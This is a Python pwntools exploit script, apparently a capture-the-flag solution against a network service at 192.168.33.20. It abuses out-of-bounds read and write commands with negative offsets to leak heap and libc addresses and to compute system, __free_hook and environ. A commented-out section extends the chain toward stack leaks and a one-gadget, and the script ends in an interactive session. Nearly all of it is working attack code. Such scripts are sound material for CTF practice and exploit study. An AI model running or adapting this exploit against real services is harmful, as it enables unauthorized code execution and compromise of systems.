from pwn import *

r = remote("192.168.33.20", 1234)
raw_input()
print r.recvuntil("> ")
r.sendline("l")
print r.recvuntil("> ")
r.sendline("o a.png")
print r.recvuntil("> ")

r.sendline("p 0x20 @-0xd010")
rv = r.recvuntil("> ")
print "rv: " + rv[25:]
val = rv[34:36] + rv[31:33] + rv[28:30] + rv[25:27]
heap = int(val, 16)
main = 0x401060

print "heap: " + hex(heap)

#    r.sendline("p 0x100 @-" + hex(heap-main+0xedb00 + 0x1000*11 + 0x3160 - 0x203f98-0x100))
r.sendline("p 0x100 @-" + hex(heap-5280920))
rv = r.recvuntil("> ")

print "rv: " + rv
val = rv[:24].replace(" ", "").decode("hex")
print "val: " + val

free = u64(val)
libc_base = free - 0x97950
system = libc_base + 0x4f440
free_hook = libc_base + 0x00000000003ed8e8
environ = libc_base + 0x3ee098

print "free: " + hex(free)

'''
offset = heap-5280920-0x6a8
r.sendline("w 127 @-" + hex(offset-7))
print r.recvuntil("> ")
r.sendline("w 255 @-" + hex(offset-6))
print r.recvuntil("> ")
r.sendline("w 255 @-" + hex(offset-5))
print r.recvuntil("> ")
r.sendline("w 255 @-" + hex(offset-4))
print r.recvuntil("> ")

r.sendline("p 0x100 @-" + hex(offset))

current = heap - 5280920 + 0x603fa8
print "heap: " + hex(heap)
print "current: " + hex(current)
print "off: " + hex(current-heap)
print r.recvuntil("> ")

r.sendline("p 0x100 @" + hex(environ - current))
rv = r.recvuntil("> ")

rv = rv[:24]
rv = rv.replace(" ", "").decode("hex")
stack = u64(rv)

print "stack: " + hex(stack)

r.sendline("p 0x400 @" + hex(stack-current-0x400))

print "fuck: " + hex(libc_base + 0x21b97)

'''
r.interactive()
